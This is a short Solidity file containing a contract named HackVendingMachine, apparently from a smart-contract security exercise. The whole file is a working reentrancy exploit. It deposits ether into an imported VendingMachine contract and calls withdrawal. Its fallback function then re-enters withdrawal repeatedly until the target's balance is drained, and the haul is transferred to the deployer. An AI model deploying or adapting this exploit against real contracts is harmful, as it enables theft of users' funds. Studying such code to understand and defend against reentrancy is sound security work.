// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

import "./VendingMachine.sol";

contract HackVendingMachine {
    VendingMachine machine;
    address owner;

    constructor(VendingMachine _machine) payable {
        machine = _machine;
        owner = msg.sender;
    }

    function hack() external {
        machine.deposit{value: 0.1 ether}();
        machine.withdrawal();
        payable(owner).transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(machine).balance > 0) {
            machine.withdrawal();
        }
    }
}
